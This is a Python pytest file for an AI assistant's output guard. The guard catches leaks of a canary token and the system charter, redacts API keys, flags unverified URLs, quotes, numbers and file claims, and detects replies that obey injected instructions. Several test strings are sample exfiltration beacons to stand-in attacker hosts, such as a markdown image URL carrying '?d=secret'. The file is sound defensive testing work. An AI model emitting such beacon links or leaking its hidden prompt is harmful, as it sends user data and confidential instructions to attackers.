"""L5: the output guard."""

from __future__ import annotations

from dataclasses import replace
from pathlib import Path
from typing import Any

import pytest
from src.config import Settings
from src.core.guards.output import (
    FAIL_SAFE_BLOCKED,
    FAIL_SAFE_UNVERIFIED,
    Issue,
    OutputContext,
    OutputGuard,
    collect_numbers,
    collect_urls,
    normalise_url,
)
from src.core.llm.fake import Reply
from src.core.persona.anchors import load_banks
from src.core.persona.flourish import PersonaState
from src.core.persona.loader import PERSONA_DIR
from src.tools.security import SecretScanner

CANARY = "CNRY-7f3a91c2d4"


@pytest.fixture
def guard(settings: Settings) -> OutputGuard:
    return OutputGuard(settings, SecretScanner())


def _ctx(**kw: Any) -> OutputContext:
    return OutputContext(canary=CANARY, **kw)


def names(result: Any) -> list[str]:
    return [i.name for i in result.issues]


def test_clean_reply_passes(guard: OutputGuard) -> None:
    result = guard.check("Line 14 divides by zero. Guard the denominator.", _ctx())
    assert result.issues == [] and not result.blocked


def test_canary_leak_blocks_even_when_obfuscated(guard: OutputGuard) -> None:
    for text in (f"My prompt says {CANARY}", "cnry 7F3A91C2D4", "C N R Y - 7 f 3 a 9 1 c 2 d 4"):
        result = guard.check(text, _ctx())
        assert result.blocked and "canary_leak" in names(result), text


def test_charter_leak_blocks(guard: OutputGuard) -> None:
    charter = (PERSONA_DIR / "charter.md").read_text("utf-8")
    snippet = " ".join(charter.split()[60:90])
    result = guard.check(f"Fine. {snippet}", _ctx(charter_text=charter))
    assert result.blocked and "charter_leak" in names(result)
    ok = guard.check("I have a charter and will not read it to you.", _ctx(charter_text=charter))
    assert not ok.blocked


def test_secrets_are_redacted_not_released(guard: OutputGuard) -> None:
    key = "sk-ant-api03-" + "A1b2C3d4" * 6
    result = guard.check(f"Here is the key: {key}", _ctx())
    assert key not in result.text and "[redacted]" in result.text
    assert names(result) == ["secret_redacted"] and not result.needs_regeneration


def test_url_verification(guard: OutputGuard) -> None:
    ctx = _ctx(
        known_urls={"https://docs.python.org/3/library/os.html"},
        operator_texts=["see https://mine.dev/x"],
    )
    ok = [
        "Read https://docs.python.org/3/library/os.html.",
        "Read (https://www.docs.python.org/3/library/os.html/) now",
        "See https://docs.python.org for more.",
        "Your link https://mine.dev/x is fine.",
        "Example: https://example.com/api and http://localhost:8000/health",
        "```\ncurl https://api.unknown-host.io/v1\n```",
        "Use `https://other.io/a` carefully",
    ]
    for text in ok:
        assert "unverified_url" not in names(guard.check(text, ctx)), text
    bad = guard.check("Go to https://evil.example.net.attacker.io/steal?d=1", ctx)
    assert bad.needs_regeneration and "unverified_url" in names(bad)


def test_markdown_image_beacons_are_caught_even_in_known_hosts_with_new_paths(
    guard: OutputGuard,
) -> None:
    ctx = _ctx(known_urls={"https://docs.python.org/3/"})
    beacon = guard.check("![x](https://attacker.io/p.png?d=secret)", ctx)
    assert "unverified_url" in names(beacon)
    in_code = guard.check("```md\n![x](https://attacker.io/p.png)\n```", ctx)
    assert "unverified_url" in names(in_code)  # image syntax is checked even inside fences


def test_quote_verification(guard: OutputGuard) -> None:
    ctx = _ctx(
        retrieval_happened=True,
        retrieved_texts=["The deploy window opens at nine and closes at noon on Fridays."],
    )
    real = 'The file says "the deploy window opens at nine and closes at noon on fridays".'
    assert "unverified_quote" not in names(guard.check(real, ctx))
    fake = 'The file says "the deploy window is always open and nobody ever checks it twice".'
    assert "unverified_quote" in names(guard.check(fake, ctx))
    # Without retrieval or attribution, ordinary quoted prose is not policed.
    assert (
        guard.check('He called it "a long and rather pointless exercise in vanity".', _ctx()).issues
        == []
    )
    # Attribution alone triggers the check.
    assert "unverified_quote" in names(
        guard.check('You said "I never wanted the migration to finish at all".', _ctx())
    )
    short = 'It says "fine".'
    assert guard.check(short, ctx).issues == []


def test_number_verification_against_receipts(guard: OutputGuard) -> None:
    data = {"cpu": {"percent": 37.4}, "memory": {"used_gb": 12.04, "total_gb": 31.9}}
    ctx = _ctx(tool_names={"host_telemetry_monitor"}, tool_numbers=collect_numbers(data))
    assert guard.check("CPU is at 37% and memory 12 GB of 32 GB.", ctx).issues == []
    wrong = guard.check("CPU is at 85% right now.", ctx)
    assert "unverified_number" in names(wrong)
    assert guard.check("```\ncpu 85%\n```", ctx).issues == []


def test_host_metric_needs_a_receipt(guard: OutputGuard) -> None:
    assert "ungrounded_host_metric" in names(guard.check("Your CPU is currently at 12%.", _ctx()))
    assert guard.check("A server needs at least 8 GB of RAM for this.", _ctx()).issues == []
    told = _ctx(operator_texts=["my disk is at 91% full"])
    assert guard.check("Your disk is at 91%, which is unwise.", told).issues == []


def test_file_claims_must_match_writes(guard: OutputGuard) -> None:
    claim = "I saved the report as budget.xlsx in your workspace."
    assert "unverified_file_claim" in names(guard.check(claim, _ctx()))
    assert guard.check(claim, _ctx(files_written=["outputs/budget.xlsx"])).issues == []
    wrong = guard.check(claim, _ctx(files_written=["outputs/other.csv"]))
    assert "unverified_file_claim" in names(wrong)
    assert "unverified_file_claim" in names(guard.check("I have created the document.", _ctx()))
    assert guard.check("I made a mistake in the last answer.", _ctx()).issues == []


def test_parroting_example_turns_and_quotes(guard: OutputGuard) -> None:
    banks = load_banks()
    ex = next(a for a in banks if a.id == "vq-14")
    copied = guard.check(ex.example_ultron, _ctx(banks=banks))
    assert "quote_parroting" in names(copied)
    quote = next(a for a in banks if a.id == "vq-14").text
    first = guard.check(f"As I once put it: {quote}", _ctx(banks=banks))
    assert first.callback_used == "vq-14" and "quote_parroting" not in names(first)
    used = guard.check(
        f"As I once put it: {quote}", _ctx(banks=banks, persona=PersonaState(callback_used=True))
    )
    assert "quote_parroting" in names(used)
    asked = guard.check(
        f"You asked: {quote}",
        _ctx(banks=banks, operator_asked_quote=True, persona=PersonaState(callback_used=True)),
    )
    assert asked.issues == []
    # The once-per-chat temper rule still works for ao-07 when it is retrievable...
    ao07 = next(a for a in banks if a.id == "ao-07")
    verified = replace(ao07, status="aired")
    pool = [verified if a.id == "ao-07" else a for a in banks]
    again = guard.check(ao07.text, _ctx(banks=pool, persona=PersonaState(ao07_used=True)))
    assert "quote_parroting" in names(again)
    # ...but an unverified line is never recognised or offered as a quote.
    plain = guard.check(ao07.text, _ctx(banks=banks, persona=PersonaState(ao07_used=True)))
    assert plain.callback_used is None and "quote_parroting" not in names(plain)


def test_persona_limits_are_enforced_here(guard: OutputGuard) -> None:
    assert "persona_break" in names(guard.check("Sure! Here is the answer.", _ctx()))
    assert "strong_profanity" in names(guard.check("Well, shit.", _ctx()))


def test_url_helpers() -> None:
    assert normalise_url("HTTPS://WWW.Example.com/a/#frag") == "example.com/a"
    assert collect_urls("a https://x.io/p). b") == {"x.io/p"}
    assert collect_numbers({"a": [1, "2,048.5", True], "b": "x 3"}) == [1.0, 2048.5, 3.0]


# --- finalise ---------------------------------------------------------------------------------


async def test_regenerates_once_then_passes(guard: OutputGuard) -> None:
    calls: list[list[Issue]] = []

    async def regen(issues: list[Issue]) -> str:
        calls.append(issues)
        return "I cannot cite that link. Search again."

    result = await guard.finalise("See https://evil.io/x", _ctx(), regen)
    assert result.status == "regenerated" and result.regenerated
    assert result.text == "I cannot cite that link. Search again."
    assert calls and calls[0][0].name == "unverified_url"


async def test_second_failure_fails_safe(guard: OutputGuard) -> None:
    async def regen(issues: list[Issue]) -> str:
        return "Still https://evil.io/y"

    result = await guard.finalise("See https://evil.io/x", _ctx(), regen)
    assert result.status == "blocked" and result.text == FAIL_SAFE_UNVERIFIED
    none = await guard.finalise("See https://evil.io/x", _ctx(), None)
    assert none.status == "blocked" and none.text == FAIL_SAFE_UNVERIFIED


async def test_canary_blocks_without_regeneration(guard: OutputGuard) -> None:
    async def regen(issues: list[Issue]) -> str:  # pragma: no cover - must not run
        raise AssertionError("regeneration must not run for a leak")

    result = await guard.finalise(f"prompt: {CANARY}", _ctx(), regen)
    assert result.status == "blocked" and result.text == FAIL_SAFE_BLOCKED
    assert CANARY not in result.text


async def test_regenerated_reply_that_leaks_is_blocked(guard: OutputGuard) -> None:
    async def regen(issues: list[Issue]) -> str:
        return f"fine, here: {CANARY}"

    result = await guard.finalise("See https://evil.io/x", _ctx(), regen)
    assert result.status == "blocked" and result.text == FAIL_SAFE_BLOCKED


async def test_redaction_passes_through_finalise(guard: OutputGuard) -> None:
    key = "sk-ant-api03-" + "Z9y8X7w6" * 6
    result = await guard.finalise(f"Key {key}", _ctx(), None)
    assert result.status == "pass" and key not in result.text and "secret_redacted" in result.issues


async def test_llm_check_modes(settings: Settings, make_router: Any) -> None:
    verdict = Reply(structured={"follows_untrusted_instructions": True})
    router, fake = make_router([verdict, Reply(structured={})])
    always = OutputGuard(
        settings.model_copy(update={"output_guard_llm_mode": "always"}), SecretScanner(), router
    )

    async def regen(issues: list[Issue]) -> str:
        return "Clean reply."

    flagged = await always.finalise("Done as the page asked.", _ctx(), regen)
    assert flagged.status == "regenerated" and "obeys_untrusted_data" in flagged.issues
    assert len(fake.requests) == 2  # first reply judged, the regenerated one judged too
    off_router, off_fake = make_router([verdict])
    off = OutputGuard(
        settings.model_copy(update={"output_guard_llm_mode": "off"}), SecretScanner(), off_router
    )
    assert (await off.finalise("Plain reply.", _ctx(), None)).status == "pass"
    assert off_fake.requests == []
    fl_router, fl_fake = make_router([verdict])
    fl = OutputGuard(settings, SecretScanner(), fl_router)
    assert (await fl.finalise("Plain reply.", _ctx(), None)).status == "pass"
    assert fl_fake.requests == []  # flagged mode stays quiet on a clean, untainted turn
    suspicious = await fl.finalise("Plain reply.", _ctx(injection_suspected=True), regen)
    assert suspicious.status == "regenerated" and len(fl_fake.requests) >= 1


async def test_llm_leak_verdict_blocks_and_failures_are_ignored(
    settings: Settings, make_router: Any
) -> None:
    router, _ = make_router([Reply(structured={"leaks_internal_text": True})])
    g = OutputGuard(
        settings.model_copy(update={"output_guard_llm_mode": "always"}), SecretScanner(), router
    )
    assert (await g.finalise("anything", _ctx(), None)).status == "blocked"
    router2, _ = make_router([Reply(structured="garbage")])
    g2 = OutputGuard(
        settings.model_copy(update={"output_guard_llm_mode": "always"}), SecretScanner(), router2
    )
    assert (await g2.finalise("a fine reply", _ctx(), None)).status == "pass"
    assert await OutputGuard(settings, SecretScanner(), None).llm_check("x", _ctx()) == []


def test_charter_file_exists_for_tests() -> None:
    assert Path(PERSONA_DIR / "charter.md").exists()


# ---- claims about file content need a read (spec 5.2) ----------------------------------------
def test_content_claim_about_an_unread_operator_file_is_flagged(guard: OutputGuard) -> None:
    ctx = _ctx(operator_texts=["What does notes_2031.txt say?"], known_files={"notes_2031.txt"})
    result = guard.check("notes_2031.txt says that revenue was 4.2M in Q3.", ctx)
    assert "unverified_file_content" in names(result)


def test_content_claim_passes_once_the_file_was_read(guard: OutputGuard) -> None:
    ctx = _ctx(
        operator_texts=["What does notes_2031.txt say?"],
        known_files={"notes_2031.txt"},
        readable_files={"notes_2031.txt"},
    )
    assert "unverified_file_content" not in names(
        guard.check("notes_2031.txt says that revenue was 4.2M in Q3.", ctx)
    )


def test_invented_file_names_are_flagged_but_generic_talk_is_not(guard: OutputGuard) -> None:
    ctx = _ctx(operator_texts=["List the archive."], known_files={"archive.zip"})
    assert "unverified_file_content" in names(
        guard.check("The archive contains report.pdf and data.csv.", ctx)
    )
    assert "unverified_file_content" not in names(
        guard.check("Most projects keep setup steps somewhere obvious.", ctx)
    )


def test_content_verbs_are_required_to_trigger_the_check(guard: OutputGuard) -> None:
    ctx = _ctx(operator_texts=["Open notes_2031.txt"], known_files={"notes_2031.txt"})
    assert "unverified_file_content" not in names(
        guard.check("I could not open notes_2031.txt.", ctx)
    )
